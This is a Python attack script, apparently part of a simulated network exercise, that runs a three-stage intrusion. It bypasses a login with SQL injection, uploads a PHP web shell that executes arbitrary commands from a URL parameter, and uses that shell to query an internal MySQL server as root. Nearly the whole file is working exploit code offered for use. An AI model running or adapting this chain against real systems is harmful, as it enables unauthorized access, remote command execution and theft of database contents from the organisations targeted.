import requests
import time
import subprocess
import base64
import os

def exploit_web_vulnerability(target):
    print("Stage 1: Exploiting web vulnerability")
    url = f"http://{target}/vulnerable.php"
    payload = {"username": "admin' OR '1'='1", "password": "anything"}
    
    session = requests.Session()
    
    try:
        response = session.post(url, data=payload)
        print(f"Status Code: {response.status_code}")
        # print(f"Response Content: {response.text[:500]}")  # Print first 500 characters of response
        
        if "Welcome, admin" in response.text:
            print("Successfully exploited SQL injection vulnerability")
            return session  # Return the session object for use in subsequent requests
        else:
            print("Exploitation failed: 'Welcome, admin' not found in response")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def privilege_escalation(target, session):
    print("Stage 2: Attempting privilege escalation")
    url = f"http://{target}/upload.php"
    php_code = """<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . " 2>&1");
    echo base64_encode($output);
}
?>"""
    files = {'file': ('shell.php', php_code)}
    try:
        response = session.post(url, files=files)
        print(f"Status Code: {response.status_code}")
        # print(f"Response Content: {response.text[:500]}")  # Print first 500 characters of response
        
        if "File uploaded successfully" in response.text:
            print("Malicious file uploaded successfully")
            return True
        else:
            print("File upload failed. 'File uploaded successfully' not found in response.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed during privilege escalation: {e}")
        return False

def data_exfiltration(target, internal_target, session):
    print("Stage 3: Data exfiltration")
    url = f"http://{target}/uploads/shell.php"
    cmd = f"echo 'SHOW DATABASES;' | mysql -h {internal_target} -u root -ppassword"
    params = {"cmd": cmd}
    try:
        response = session.get(url, params=params)
        print(f"Status Code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                decoded_content = base64.b64decode(response.text).decode('utf-8')
                print(f"Decoded Response Content: {decoded_content[:500]}")  # Print first 500 characters of decoded response
                
                if "information_schema" in decoded_content.lower():
                    print("Successfully exfiltrated data from internal database")
                    return True
                else:
                    print("Failed to exfiltrate meaningful data from the database.")
                    return False
            except:
                print("Failed to decode the response content.")
                return False
        else:
            print(f"Failed to execute command on the server. Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed during data exfiltration: {e}")
        return False

def main():
    web_server = "172.16.238.2"
    internal_server = "172.16.240.10"
    
    session = exploit_web_vulnerability(web_server)
    if session:
        print("Stage 1 completed successfully")
        if privilege_escalation(web_server, session):
            print("Stage 2 completed successfully")
            if data_exfiltration(web_server, internal_server, session):
                print("Attack completed successfully")
            else:
                print("Stage 3: Data exfiltration failed")
        else:
            print("Stage 2: Privilege escalation failed")
    else:
        print("Stage 1: Initial exploitation failed")

if __name__ == "__main__":
    main()

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')